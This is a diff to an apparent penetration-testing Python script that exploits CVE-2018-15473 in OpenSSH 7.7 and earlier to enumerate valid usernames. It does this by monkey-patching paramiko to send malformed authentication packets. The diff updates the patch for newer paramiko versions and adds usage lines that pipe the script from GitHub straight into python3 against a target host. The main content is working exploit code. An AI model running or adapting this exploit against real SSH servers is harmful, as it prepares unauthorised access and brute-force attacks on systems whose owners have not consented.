@@ -9,7 +9,13 @@
 # Script de NiPeGun para x
 #
 # Ejecución remota (puede requerir permisos sudo):
-#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/1-Enumerate/SSH/TestUsernames.py | python3 - "Cadena"
+#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/1-Enumerate/SSH/TestUsernames.py | python3 - 'HostRemoto'
+#
+# Ejecución remota (puede requerir permisos sudo):
+#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/1-Enumerate/SSH/TestUsernames.py | python3 - 'HostRemoto' -p 2222 -u admin
+#
+# Ejecución remota (puede requerir permisos sudo):
+#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/1-Enumerate/SSH/TestUsernames.py | python3 - 'HostRemoto' -p 2222 -w UsernamesWordList.txt -t 8
 #
 # Bajar y editar directamente el archivo en nano
 #   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/1-Enumerate/SSH/TestUsernames.py | nano -
@@ -221,23 +227,45 @@ def fApplyMonkeyPatch() -> None:
     """ Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. """
 
   vAuthHandler = paramiko.auth_handler.AuthHandler
-  vOldMsgServiceAccept = vAuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
-  def fPatchedMsgServiceAccept(*pArgs, **pKwargs):
-    """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
-    vOldAddBoolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, fPatchedAddBoolean
-    vRetval = vOldMsgServiceAccept(*pArgs, **pKwargs)
-    paramiko.message.Message.add_boolean = vOldAddBoolean
-    return vRetval
+  # En paramiko >= 3.4, _client_handler_table es una @property, no un dict de clase
+  if isinstance(vAuthHandler.__dict__.get('_client_handler_table'), property):
+    # Guardar referencia al método original (función sin enlazar)
+    vOldParseServiceAccept = vAuthHandler._parse_service_accept
 
-  def fPatchedUserauthFailure(*pArgs, **pKwargs):
-    """ Called during authentication when a username is not found. """
-    raise InvalidUsername(*pArgs, **pKwargs)
+    def fPatchedParseServiceAccept(self, *pArgs, **pKwargs):
+      """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
+      vOldAddBoolean = paramiko.message.Message.add_boolean
+      paramiko.message.Message.add_boolean = fPatchedAddBoolean
+      vRetval = vOldParseServiceAccept(self, *pArgs, **pKwargs)
+      paramiko.message.Message.add_boolean = vOldAddBoolean
+      return vRetval
 
-  vAuthHandler._client_handler_table.update({
-    paramiko.common.MSG_SERVICE_ACCEPT: fPatchedMsgServiceAccept,
-    paramiko.common.MSG_USERAUTH_FAILURE: fPatchedUserauthFailure
-  })
+    def fPatchedParseUserauthFailure(self, *pArgs, **pKwargs):
+      """ Called during authentication when a username is not found. """
+      raise InvalidUsername(*pArgs, **pKwargs)
+
+    vAuthHandler._parse_service_accept = fPatchedParseServiceAccept
+    vAuthHandler._parse_userauth_failure = fPatchedParseUserauthFailure
+  else:
+    # Paramiko antiguo: _client_handler_table es un dict de clase
+    vOldMsgServiceAccept = vAuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+
+    def fPatchedMsgServiceAccept(*pArgs, **pKwargs):
+      """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
+      vOldAddBoolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, fPatchedAddBoolean
+      vRetval = vOldMsgServiceAccept(*pArgs, **pKwargs)
+      paramiko.message.Message.add_boolean = vOldAddBoolean
+      return vRetval
+
+    def fPatchedUserauthFailure(*pArgs, **pKwargs):
+      """ Called during authentication when a username is not found. """
+      raise InvalidUsername(*pArgs, **pKwargs)
+
+    vAuthHandler._client_handler_table.update({
+      paramiko.common.MSG_SERVICE_ACCEPT: fPatchedMsgServiceAccept,
+      paramiko.common.MSG_USERAUTH_FAILURE: fPatchedUserauthFailure
+    })
 
 
 def fCreateSocket(pHostname: str, pPort: int) -> Union[socket.socket, None]:
@@ -246,8 +274,6 @@ def fCreateSocket(pHostname: str, pPort: int) -> Union[socket.socket, None]:
   Returns:
       socket.socket or None
   """
-  # spoiler alert, I don't care about the -6 flag, it's really
-  # just to advertise in the help that the program can handle ipv6
   try:
     return socket.create_connection((pHostname, pPort))
   except socket.error as e:
@@ -337,9 +363,9 @@ def fMain(**pKwargs):
 
     vVersion = float(vRegex.group(1))
 
-    # CVE_2018_15473: OpenSSH <= 7.7
+    # CVE-2018-15473: OpenSSH <= 7.7
     if vVersion <= 7.7:
-      print(f"[+] OpenSSH {Color.mString(vVersion, pColor='green')} es vulnerable a {Color.mString('CVE_2018_15473', pColor='green')}")
+      print(f"[+] OpenSSH {Color.mString(vVersion, pColor='green')} es vulnerable a {Color.mString('CVE-2018-15473', pColor='green')}")
       print(f"[*] Procediendo con enumeración de usuarios...\n")
       fEnumerarCVE_2018_15473(
         pHostname=vHostname,
@@ -363,11 +389,9 @@ if __name__ == '__main__':
 
   vParser.add_argument('hostname', help='target to enumerate', type=str)
   vParser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)
-  vParser.add_argument('-t', '--threads', help="number of threads (default: 4)", default=4, type=int)
+  vParser.add_argument('-t', '--threads', help="number of threads (default: 1)", default=1, type=int)
   vParser.add_argument('-v', '--verbose', action='store_true', default=False,
                        help="print both valid and invalid usernames (default: False)")
-  vParser.add_argument('-6', '--ipv6', action='store_true', help="Specify use of an ipv6 address (default: ipv4)")
-
   vMultiOrSingleGroup = vParser.add_mutually_exclusive_group(required=True)
   vMultiOrSingleGroup.add_argument('-w', '--wordlist', type=str, help="path to wordlist")
   vMultiOrSingleGroup.add_argument('-u', '--username', help='a single username to test', type=str)
@@ -377,4 +401,3 @@ if __name__ == '__main__':
   logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
   fMain(**vars(vArgs))
-
